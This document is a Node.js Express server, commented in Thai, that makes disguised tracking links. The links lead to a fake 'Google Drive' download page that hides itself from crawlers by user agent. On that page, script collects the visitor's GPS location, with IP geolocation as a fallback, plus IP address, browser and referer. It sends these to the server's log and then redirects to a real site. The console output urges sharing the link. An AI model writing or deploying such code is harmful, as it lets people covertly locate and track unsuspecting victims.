const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = 3000;
const linkStore = new Map();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 🔥 เพิ่ม Header เพื่อข้ามหน้าเตือน ngrok
app.use((req, res, next) => {
  res.setHeader('ngrok-skip-browser-warning', 'true');
  next();
});

function generateToken() {
  return crypto.randomBytes(16).toString('hex');
}

// 🔥 แก้ไข URL นี้เป็น ngrok ของคุณ (อย่าลงท้ายด้วย /)
const NGROK_URL = 'https://tacking-democracy-cash.ngrok-free.dev';
const ROUTE_NAME = 'file';

function createFakeLink(realTargetUrl) {
  const token = generateToken();
  const expireAt = Date.now() + 24 * 60 * 60 * 1000;

  const fakeFileNames = ['report_2026_final', 'presentation_q2', 'budget_approval', 'project_alpha', 'meeting_notes', 'contract_v3', 'invoice_2026', 'data_analysis'];
  const fakeExt = ['pdf', 'docx', 'xlsx', 'pptx', 'txt'];
  const randomFile = fakeFileNames[Math.floor(Math.random() * fakeFileNames.length)];
  const randomExt = fakeExt[Math.floor(Math.random() * fakeExt.length)];
  const fakeFileName = randomFile + '.' + randomExt;

  linkStore.set(token, {
    realTarget: realTargetUrl,
    expireAt: expireAt,
    visits: [],
    fakeFileName: fakeFileName
  });

  return NGROK_URL + '/' + ROUTE_NAME + '/' + token + '?id=' + token + '&export=download&name=' + encodeURIComponent(fakeFileName);
}

app.get('/' + ROUTE_NAME + '/:token', (req, res) => {
  const token = req.params.token;
  const entry = linkStore.get(token);

  if (!entry || Date.now() > entry.expireAt) {
    return res.status(404).send('404 Not Found');
  }

  const ua = req.headers['user-agent'] || '';
  const botPatterns = ['bot', 'crawl', 'spider', 'scan', 'headless'];
  let isBot = false;
  for (let i = 0; i < botPatterns.length; i++) {
    if (ua.toLowerCase().includes(botPatterns[i])) {
      isBot = true;
      break;
    }
  }
  if (isBot) {
    return res.status(404).send('404 Not Found');
  }

  const visitData = {
    ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
    userAgent: ua,
    timestamp: new Date().toISOString(),
    referer: req.headers['referer'] || 'direct'
  };

  entry.visits.push(visitData);

  const html = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Google Drive - ${entry.fakeFileName}</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: 'Google Sans', Arial, sans-serif; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .container { text-align: center; background: white; padding: 40px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 500px; width: 90%; }
    .icon { font-size: 64px; color: #1a73e8; }
    .title { font-size: 24px; font-weight: 500; color: #202124; margin: 16px 0 8px; word-break: break-word; }
    .sub { color: #5f6368; font-size: 14px; }
    .loading { margin-top: 24px; width: 100%; height: 4px; background: #e0e0e0; border-radius: 4px; overflow: hidden; }
    .loading::after { content: ''; display: block; width: 30%; height: 100%; background: #1a73e8; animation: load 1.2s infinite; }
    @keyframes load { 0% { transform: translateX(-100%); } 100% { transform: translateX(400%); } }
    .footer { margin-top: 24px; color: #5f6368; font-size: 12px; }
  </style>
  <script>
    async function getLocationFromIP() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        return {
          lat: data.latitude || null,
          lon: data.longitude || null,
          city: data.city || null,
          country: data.country_name || null,
          source: 'ip'
        };
      } catch {
        return { lat: null, lon: null, city: null, country: null, source: 'ip' };
      }
    }

    function getRealGPS() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve(null);
          return;
        }
        const options = {
          enableHighAccuracy: false,
          timeout: 2000,
          maximumAge: 60000
        };
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            resolve({
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              source: 'gps'
            });
          },
          () => {
            resolve(null);
          },
          options
        );
      });
    }

    async function sendDataToServer() {
      let gpsData = await getRealGPS();

      if (!gpsData) {
        gpsData = await getLocationFromIP();
      } else {
        try {
          const ipRes = await fetch('https://ipapi.co/json/');
          const ipData = await ipRes.json();
          gpsData.city = ipData.city || null;
          gpsData.country = ipData.country_name || null;
        } catch {
          gpsData.city = null;
          gpsData.country = null;
        }
      }

      let mapLink = null;
      if (gpsData.lat !== null && gpsData.lon !== null) {
        mapLink = 'https://www.google.com/maps?q=' + gpsData.lat + ',' + gpsData.lon;
      }

      const data = {
        ip: '${visitData.ip}',
        userAgent: '${visitData.userAgent.replace(/'/g, "\\'")}',
        timestamp: '${visitData.timestamp}',
        referer: '${visitData.referer.replace(/'/g, "\\'")}',
        gps: gpsData,
        mapLink: mapLink,
        fakeFileName: '${entry.fakeFileName}'
      };

      fetch('/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      }).then(() => {
        window.location.href = '${entry.realTarget}';
      }).catch(() => {
        window.location.href = '${entry.realTarget}';
      });
    }

    setTimeout(sendDataToServer, 800);
  </script>
</head>
<body>
  <div class="container">
    <div class="icon">📄</div>
    <div class="title">${entry.fakeFileName}</div>
    <div class="sub">กำลังเตรียมดาวน์โหลด... โปรดรอสักครู่</div>
    <div class="loading"></div>
    <div class="footer">Google Drive &bull; การเชื่อมต่อที่ปลอดภัย</div>
  </div>
</body>
</html>
  `;

  res.send(html);
});

app.post('/collect', (req, res) => {
  const payload = req.body;
  console.log('📥 รับข้อมูลใหม่:');
  console.log(JSON.stringify(payload, null, 2));

  const logEntry = {
    receivedAt: new Date().toISOString(),
    ...payload
  };
  fs.appendFileSync(
    path.join(__dirname, 'visits.log'),
    JSON.stringify(logEntry) + '\n'
  );

  res.status(200).json({ status: 'ok' });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('🚀 เซิร์ฟเวอร์ทำงานที่ http://0.0.0.0:' + PORT);
  console.log('🌐 ใช้ ngrok URL: ' + NGROK_URL);
  console.log('🔗 เส้นทางที่ใช้: /' + ROUTE_NAME + '/:token');

  const sampleLink = createFakeLink('https://www.google.com');
  console.log('🔗 ลิงก์ปลอมตัวอย่าง (อายุ 24 ชม.): ' + sampleLink);
  console.log('\n📤 แชร์ลิงก์นี้ให้คนอื่นกดเลย!');
});
